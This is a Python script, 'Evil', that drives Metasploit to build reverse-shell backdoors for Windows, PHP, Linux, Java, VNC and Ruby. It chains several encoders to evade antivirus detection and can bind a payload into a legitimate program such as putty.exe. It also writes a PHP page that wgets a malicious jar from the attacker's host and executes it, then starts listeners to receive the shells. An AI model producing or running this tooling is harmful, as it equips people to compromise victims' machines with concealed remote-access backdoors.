
# ** Evil **
#Metasploit Backdoor Generator / Multiple Encoder
#This software needs Metasploit
#No one virus is really undetectable but encoding it,it  is more difficult to detect [BUT NOT IMPOSSIBLE]
#Metasploit softwares must be in /usr/bin directory or you must modify the code manually
#Created by D35m0nd142
#!/usr/bin/python
import sys
from socket import *
import time
import os
from tkMessageBox import *
import Tkinter
cmd=" "
if sys.platform == 'win':
        cmd="cls"
elif sys.platform == 'linux' or sys.platform == 'linux2':
        cmd="clear"
os.system(cmd)
print "[!] The author is not responsible for the use of this software [!]"
time.sleep(1.5)
os.system(cmd)
os.system("mkdir backdoor_generation")
print "*************************************************"
print "*                   Evil                        *"
print "*************************************************"
print "*  Metasploit Backdoor Generator/Multi Encoder  *"
print "*           Created by D35m0nd142               *"
print "*        Category: Metasploit Handler           *"
print "*       Official Demonstration Video at         *"
print "*    http://www.youtube.com/user/D35m0nd142     *"
print "*************************************************\n"
time.sleep(1)
show_ip="ifconfig | grep inet"
print "------------------------------------------------------------------------------------------------------------"
print " Your informations :                                                                                        "
print "------------------------------------------------------------------------------------------------------------"
os.system(show_ip)
print "------------------------------------------------------------------------------------------------------------\n"
time.sleep(1)
lhost=raw_input("Enter LHOST --> ")
time.sleep(1)
lport=raw_input("Enter LPORT --> ")
time.sleep(1)
print "---------------------------------------------"
print " Available Backdoors :                       "
print "---------------------------------------------"
print " 1) Windows Meterpreter Reverse TCP (.exe)   "
print " 2) PHP Reverse TCP (.php)                   "
print " 3) Linux x86 Reverse Shell                  "
print " 4) Java Reverse Shell (.jar)                "
print " 5) Windows VNC Reverse Shell (.exe)         "
print " 6) Ruby Reverse TCP (.rb) (Windows/Unix)    "
print "---------------------------------------------\n"
choice=input("Choice --> ")
time.sleep(1)
if choice==1:
        print "* Backdoor selected --> Windows Meterpreter Reverse TCP (exe) *\n"
elif choice==2:
        print "* Backdoor selected --> PHP Reverse TCP (php) *\n"
elif choice==3:
        print "* Backdoor selected --> Linux x86 Reverse Shell *\n"
elif choice==4:
        print "* Backdoor selected --> Java Reverse Shell * \n"
elif choice==5:
        print "* Backdoor selected --> Windows VNC Reverse Shell *\n"
elif choice==6:
        print "* Backdoor selected --> Ruby Reverse TCP (Windows/Unix) *\n"
else:
        print "No valid option selected\n"
time.sleep(1)
if choice==1:
        dir1="mkdir backdoor_generation/windows"
        os.system(dir1)
        print "-------------------------------------------"
        print " Available Encodes :                       "
        print "-------------------------------------------"
        print " 1) Simple Encode                          "
        print " 2) Hard Encode                            "
        print " 3) Hide into another process (like Putty) "
        print " 4) No encode                              "
        print "-------------------------------------------\n"
        choice1=input("Choice --> ")
        time.sleep(1)
        if choice==1 and choice1==1:
                output=raw_input("Enter output backdoor name (.exe) --> ")
                time.sleep(0.3)
                command="msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R | msfencode -t exe -e x86/shikata_ga_nai -c 5 -o backdoor_generation/windows/%s" %(lhost,lport,output)
                print "Creating Backdoor with Simple Encode (x86/shikata_ga_nai) . . wait please . . "
                print "------------------------------------------------------------------------------------------------------------"
                os.system(command)     
                print "[+] Backdoor with Simple Encode created successfully --> backdoor_generation/windows/%s .\n" %output
                print "------------------------------------------------------------------------------------------------------------\n"
               
        elif choice==1 and choice1==2:
                encode=raw_input("Enter time to encode --> ")
                time.sleep(0.3)
                output=raw_input("Enter output backdoor name (.exe) --> ")
                time.sleep(1)
                print "Creating Backdoor with Hard Encode (times = %s) . . wait please . . \n" %encode
                command="msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R | msfencode -e x86/shikata_ga_nai -t raw -c %s | msfencode -e x86/jmp_call_additive -t raw -c %s | msfencode -e x86/alpha_mixed -t raw -c %s | msfencode -e x86/countdown -t exe > backdoor_generation/windows/%s" %(lhost,lport,encode,encode,encode,output)
                print "------------------------------------------------------------------------------------------------------------"
                os.system(command)
                print "[+] Backdoor created with Super Encode and name %s \n" %output
                print "------------------------------------------------------------------------------------------------------------\n"
 
        elif choice==1 and choice1==3:
                process=raw_input("Enter exactly process name (ex: putty.exe) --> ")
                time.sleep(0.3)
                output=raw_input("Enter output backdoor name (.exe) --> ")
                time.sleep(0.3)
                command="msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s R | msfencode -t exe -x %s -k -o backdoor_generation/windows/%s -e x86/shikata_ga_nai -c 5" %(lhost,lport,process,output)
                print "Creating Backdoor with %s appearance . . wait please . . " %process
                print "------------------------------------------------------------------------------------------------------------"
                os.system(command)
                print "[+] Backdoor with %s appearance created successfully --> backdoor_generation/windows/%s .\n" %(process,output)
                print "------------------------------------------------------------------------------------------------------------\n"
               
        elif choice==1 and choice1==4:
                output=raw_input("Enter output backdoor name (.exe) --> ")
                time.sleep(0.3)
                command="msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > backdoor_generation/windows/%s" %(lhost,lport,output)
                print "Creating Backdoor not encoded with name %s . . wait please . .\n" %output
                print "------------------------------------------------------------------------------------------------------------"   
                os.system(command)
                print "[+] Backdoor with no encode created successfully --> backdoor_generation/windows/%s .\n" %output
                print "------------------------------------------------------------------------------------------------------------\n"
        time.sleep(1)
        metasploit=raw_input("Do you want to start Metasploit listener ? [Y/N] --> ")
        if metasploit=='Y' or metasploit =='y':
                command1="msfcli multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s E" %(lhost,lport)
                os.system(command1)
        else:
                print ".. Bye :)\n"
 
if choice==2:
        dir1="mkdir backdoor_generation/php"
        os.system(dir1)
        print "------------------------------------"
        print " Available Encodes :                "
        print "------------------------------------"
        print " 1) No Encode                       "
        print " 2) Base64 Encode                   "
        print "------------------------------------\n"
        choice2=input("Choice --> ")
        time.sleep(1)
        if choice2==1:
                output=raw_input("Enter output backdoor name (.php) --> ")
                time.sleep(0.5)
                print "Creating PHP Backdoor with no encode . . wait please . . \n"
                command="msfpayload php/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > backdoor_generation/php/%s" %(lhost,lport,output)
                os.system(command)
                print "[+] PHP Backdoor with no Encode created successfully --> backdoor_generation/php/%s. \n" %output
                time.sleep(1)
        if choice2==2:
                output=raw_input("Enter output backdoor name (.php) --> ")
                print "Creating PHP Backdoor with Base64 Encode . . wait please . . \n"
                command="msfpayload php/meterpreter/reverse_tcp LHOST=%s LPORT=%s R | msfencode -e php/base64 -t raw -o backdoor_generation/php/%s" %(lhost,lport,output)
                print "------------------------------------------------------------------------------------------------------------"
                os.system(command)
                file=open("backdoor_generation/php/startfile11.php","a")
                file.write("<?php\n")
                file.close()
                file1=open("backdoor_generation/php/endfile11.php" , "a")
                file1.write("?>\n")
                insert="cat backdoor_generation/php/%s >> backdoor_generation/php/startfile11.php" %output
                os.system(insert)
                close="cat backdoor_generation/php/endfile11.php >> backdoor_generation/php/startfile11.php"
                os.system(close)
                replace="rm backdoor_generation/php/%s | mv backdoor_generation/php/startfile11.php backdoor_generation/php/%s" %(output,output)
                os.system(replace)
                view="cat backdoor_generation/php/%s" %output
                os.system(view)
                time.sleep(0.5)
                print "\n[+] PHP Backdoor with Base64 Encode created successfully --> backdoor_generation/php/%s . \n" %output
                print "------------------------------------------------------------------------------------------------------------"
                time.sleep(1)
 
        webpage=raw_input("Do you want to copy your malicious php file in your web directory ? [Y/N] ? ")
        if webpage=='Y' or webpage=='y':
                direct=raw_input("Enter your web directory (ex: /var/www) --> ")
                command3="cp backdoor_generation/php/%s %s" %(output,direct)
                print " . . Copying . . "
                time.sleep(0.5)
                os.system(command3)
 
       
        metasploit=raw_input("Do you want to start Metasploit listener ? [Y/N] --> ")
        if metasploit=='Y' or metasploit =='y':
                command1="msfcli multi/handler PAYLOAD=php/meterpreter/reverse_tcp LHOST=%s LPORT=%s E" %(lhost,lport)
                os.system(command1)
        else:
                print ".. Bye :)\n"
       
 
if choice==3:
        dir1="mkdir backdoor_generation/linux"
        os.system(dir1)
        print "------------------------------------"
        print " Available Encodes :                "
        print "------------------------------------"
        print " 1) No Encode                       "
        print " 2) Linux ELF Binary Encode         "
        print "------------------------------------\n"
        choice1 = input("Choice --> ")
        if choice1==1:
                output=raw_input("Enter output backdoor name (no extensions) --> ")
                time.sleep(0.5)
                print "Creating Linux x86 Backdoor . . wait please . . \n"
                command="msfpayload linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > backdoor_generation/linux/%s" %(lhost,lport,output)
                print "------------------------------------------------------------------------------------------------------------"   
                os.system(command)
                chmod1 = "chmod +x %s" %output
                os.system(chmod1)
                print "[+] Linux x86 Reverse Shell created successfully --> backdoor_generation/linux/%s \n"
                print "------------------------------------------------------------------------------------------------------------"
       
        elif choice1==2:
                output=raw_input("Enter output backdoor name (no extensions) --> ")
                time.sleep(0.5)
                print "Creating Linux x86 Backdoor with Linux ELF Binary Encode . . wait please . . \n"
                command="msfpayload linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s R | msfencode -t elf -o backdoor_generation/linux/%s" %(lhost,lport,output)
                os.system(command)
                print "[+] Linux x86 Backdoor with Linux ELF Binary Encode backdoor_generation/linux/%s created successfully . \n" %output
 
 
        metasploit=raw_input("Do you want to start Metasploit listener ? [Y/N] --> ")
        if metasploit=='Y' or metasploit =='y':
                command1="msfcli multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s E" %(lhost,lport)
                os.system(command1)
        else:
                time.sleep(0.4)
                print ".. Bye :)\n"
 
if choice==4:
        dir1="mkdir backdoor_generation/java"
        os.system(dir1)
        print "------------------------------------"
        print " Available Encodes :                "
        print "------------------------------------"
        print " 1) No Encode                       "
        print "------------------------------------\n"
        choice1=input("Choice --> ")
        time.sleep(1)  
        output=raw_input("Enter output backdoor name (.jar) --> ")     
        if choice1==1:
                print "Creating Java Reverse Shell Backdoor with no Encode . . wait please . . \n"
                command="msfpayload java/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > backdoor_generation/java/%s" %(lhost,lport,output)
                print "------------------------------------------------------------------------------------------------------------"   
                os.system(command)
                print "[+] Java Reverse Shell Backdoor created successfully --> backdoor_generation/java/%s ." %output
                print "------------------------------------------------------------------------------------------------------------\n"
                time.sleep(1.2)
                page=raw_input("Do you want to generate PHP web page with redirect to your malicious file or you want to do manually (works only with Linux servers) ?[Y/N]")
                time.sleep(0.7)
                if page=='Y' or page=='y':
                        web_dir=raw_input("Enter your web directory (ex: /var/www) --> ")
                        time.sleep(0.8)
                        copy="cp backdoor_generation/java/%s %s" %(output,web_dir)
                        os.system(copy)
                        print "Generating PHP page for redirect victim to download and execute --> %s" %output
                        time.sleep(1.5)
                        webpage=open("vuln.php","a")
                        page1="<?php\n exec('wget http://%s/%s'); \n exec('java -jar %s'); \n?>" %(lhost,output,output)
                        webpage.write(page1)
                        webpage.close()
                        move="mv vuln.php %s" %web_dir
                        os.system(move)
                        print "PHP Webpage created and available at --> http://%s/vuln.php\n" %lhost
                        time.sleep(1)
        metasploit=raw_input("Do you want to start Metasploit listener ? [Y/N] --> ")
        if metasploit=='Y' or metasploit =='y':
                command1="msfcli multi/handler PAYLOAD=java/meterpreter/reverse_tcp LHOST=%s LPORT=%s E" %(lhost,lport)
                os.system(command1)
 
        else:
                time.sleep(0.4)
                print ".. Bye :)\n"
 
         
if choice==5:
        dir1="mkdir backdoor_generation/windows"
        dir2="mkdir backdoor_generation/windows/vnc"
        os.system(dir1)
        os.system(dir2)
        print "------------------------------------"
        print " Available Encodes :                "
        print "------------------------------------"
        print " 1) No Encode                       "
        print "------------------------------------\n"
        choice1=input("Choice --> ")
        time.sleep(1)  
        output=raw_input("Enter output backdoor name (.exe) --> ")
        time.sleep(1)  
        if choice1==1:
                print "Creating Windows VNC Reverse TCP Backdoor with no encode . . wait please . . \n"
                command="msfpayload windows/vncinject/reverse_tcp LHOST=%s LPORT=%s X > backdoor_generation/windows/vnc/%s" %(lhost,lport,output)
                print "------------------------------------------------------------------------------------------------------------"
                os.system(command)
                print "[+] Windows VNC Reverse TCP Backdoor created successfully --> backdoor_generation/windows/vnc/%s ." %output     
                print "------------------------------------------------------------------------------------------------------------\n"
 
        metasploit=raw_input("Do you want to start Metasploit listener ? [Y/N] --> ")
        if metasploit=='Y' or metasploit =='y':
                command1="msfcli multi/handler PAYLOAD=windows/vncinject/reverse_tcp LHOST=%s LPORT=%s E" %(lhost,lport)
                os.system(command1)
        else:
                time.sleep(0.5)
                print ".. Bye :)\n"
 
 
if choice==6:
        dir1="mkdir backdoor_generation/ruby"
        os.system(dir1)
        print "-------------------------------------"
        print " 1) Windows Reverse Shell            "
        print " 2) Unix Reverse Ruby                "
        print "-------------------------------------\n"
        choice1=input("Choice --> ")
        output=raw_input("Enter the output backdoor name (.rb) --> ")
        if choice1==1:
                dir2="mkdir backdoor_generation/ruby/windows"
                os.system(dir2)
                print "Creating Ruby Windows Reverse Shell . . wait please . . \n"
                command="msfpayload cmd/windows/reverse_ruby LHOST=%s LPORT=%s y > %s" %(lhost,lport,output)
                os.system(command)
                print "------------------------------------------------------------------------------------------------------------"
                print "[+] Windows Ruby Reverse Shell created successfully --> backdoor_generation/ruby/windows/%s ." %output
                print "------------------------------------------------------------------------------------------------------------\n"
 
                metasploit=raw_input("Do you want to start Metasploit listener ? [Y/N] --> ")
                if metasploit=='Y' or metasploit =='y':
                        command1="msfcli multi/handler PAYLOAD=cmd/windows/reverse_ruby LHOST=%s LPORT=%s E" %(lhost,lport)
                        os.system(command1)
                else:
                        time.sleep(0.5)
                        print ".. Bye :)\n"
 
        if choice1==2:
                dir2="mkdir backdoor_generation/ruby/unix"
                os.system(dir2)
                print "Creating Ruby Unix Revese Shell . . wait please . . \n"
                command="msfpayload cmd/unix/reverse_ruby LHOST=%s LPORT=%s y > backdoor_generation/ruby/unix/%s" %(lhost,lport,output)
                os.system(command)
                print "------------------------------------------------------------------------------------------------------------"
                print "[+] Unix Ruby Reverse Shell created successfully --> backdoor_generation/ruby/unix/%s ." %output
                print "------------------------------------------------------------------------------------------------------------\n"
 
                metasploit=raw_input("Do you want to start Metasploit listener ? [Y/N] --> ")
                if metasploit=='Y' or metasploit =='y':
                        command1="msfcli multi/handler PAYLOAD=cmd/unix/reverse_ruby LHOST=%s LPORT=%s E" %(lhost,lport)
                        os.system(command1)
                else:
                        time.sleep(0.5)
                        print ".. Bye :)\n"
